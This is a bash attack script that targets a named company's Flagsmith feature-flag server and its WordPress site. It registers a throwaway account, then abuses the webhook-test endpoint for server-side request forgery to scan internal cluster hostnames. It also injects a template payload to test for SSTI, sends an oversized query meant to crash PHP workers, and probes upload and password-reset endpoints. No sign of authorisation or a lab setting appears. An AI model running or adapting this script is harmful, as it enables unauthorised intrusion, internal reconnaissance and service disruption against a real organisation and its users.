#!/bin/bash
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"

# Register fresh account
ACCT=$(curl -s -X POST "https://flagsmith.koinworks.com/api/v1/auth/users/" \
  -H "Content-Type: application/json" -H "User-Agent: $UA" \
  -d '{"email":"kw-v14@proton.me","password":"Xk9mPw3nRt!14","first_name":"V","last_name":"14"}' --max-time 15)
KEY=$(echo "$ACCT" | python3 -c "import json,sys; print(json.load(sys.stdin).get('key',''))" 2>/dev/null)
echo "Key: $KEY"

[ -z "$KEY" ] && echo "REG FAILED" && exit 1

# Create org + project + env
OID=$(curl -s -X POST "https://flagsmith.koinworks.com/api/v1/organisations/" \
  -H "Authorization: Token $KEY" -H "Content-Type: application/json" -H "User-Agent: $UA" \
  -d '{"name":"v14"}' --max-time 10 | python3 -c "import json,sys; print(json.load(sys.stdin).get('id',''))" 2>/dev/null)
PID=$(curl -s -X POST "https://flagsmith.koinworks.com/api/v1/projects/" \
  -H "Authorization: Token $KEY" -H "Content-Type: application/json" -H "User-Agent: $UA" \
  -d "{\"name\":\"p\",\"organisation\":$OID}" --max-time 10 | python3 -c "import json,sys; print(json.load(sys.stdin).get('id',''))" 2>/dev/null)
EKEY=$(curl -s -X POST "https://flagsmith.koinworks.com/api/v1/environments/" \
  -H "Authorization: Token $KEY" -H "Content-Type: application/json" -H "User-Agent: $UA" \
  -d "{\"name\":\"e\",\"project\":$PID}" --max-time 10 | python3 -c "import json,sys; print(json.load(sys.stdin).get('api_key',''))" 2>/dev/null)
echo "Org:$OID Proj:$PID Env:$EKEY"

SSRF() {
  curl -s -X POST "https://flagsmith.koinworks.com/api/v1/environments/${EKEY}/webhooks/test/" \
    -H "Authorization: Token $KEY" -H "Content-Type: application/json" -H "User-Agent: $UA" \
    -d "{\"url\":\"$1\"}" --max-time 25 2>/dev/null || echo "TIMEOUT"
}

# === TEST 1: SSTI via feature flag ===
echo "=== SSTI TEST ==="
# Create feature with template payload in initial_value
feat=$(curl -s -X POST "https://flagsmith.koinworks.com/api/v1/projects/${PID}/features/" \
  -H "Authorization: Token $KEY" -H "Content-Type: application/json" -H "User-Agent: $UA" \
  -d '{"name":"ssti_test","type":"FLAG","default_enabled":true,"initial_value":"{{7*7}}"}' --max-time 10)
echo "Feature: $feat" | head -c 200
echo ""

# Check if value got rendered
flags=$(curl -s "https://flagsmith.koinworks.com/api/v1/flags/" \
  -H "X-Environment-Key: $EKEY" -H "User-Agent: $UA" --max-time 10)
echo "Flags: $flags" | head -c 300
echo ""

# === TEST 2: SSRF to internal koinworks services ===
echo "=== INTERNAL SERVICES SCAN ==="
# GCP internal DNS names
for host in \
  "koinp2p.internal" \
  "wordpress.koinworks.internal" \
  "wp.koinworks.internal" \
  "koinp2p.koinworks.svc.cluster.local" \
  "flagsmith-api.default.svc.cluster.local" \
  "redis-master.default.svc.cluster.local"; do
  echo -n "$host -> "
  SSRF "http://${host}/"
  echo ""
done

# === TEST 3: PHP2Shell via koinp2p admin-ajax (multipart in URL query?) ===
# This won't work for PHP2Shell but let me test something creative:
# What if we can trigger PHP fatal error via admin-ajax to corrupt worker state?
echo "=== PHP WORKER CRASH TEST ==="
# Send very long query string to trigger memory issues
LONG=$(python3 -c "print('A'*50000)")
echo -n "Long query -> "
SSRF "https://koinp2p.com/wp-admin/admin-ajax.php?action=heartbeat&data=${LONG}"
echo ""

# === TEST 4: Check if koinp2p.com has any writable upload endpoint ===
echo "=== UPLOAD ENDPOINT SCAN ==="
for path in \
  "wp-admin/async-upload.php" \
  "wp-admin/media-new.php" \
  "wp-admin/admin-post.php" \
  "wp-admin/admin-ajax.php?action=upload-attachment"; do
  echo -n "$path -> "
  SSRF "https://koinp2p.com/${path}"
  echo ""
done

# === TEST 5: WordPress password reset (triggers email with internal info) ===
echo "=== WP PASSWORD RESET ==="
SSRF "https://koinp2p.com/wp-login.php?action=lostpassword"
echo ""
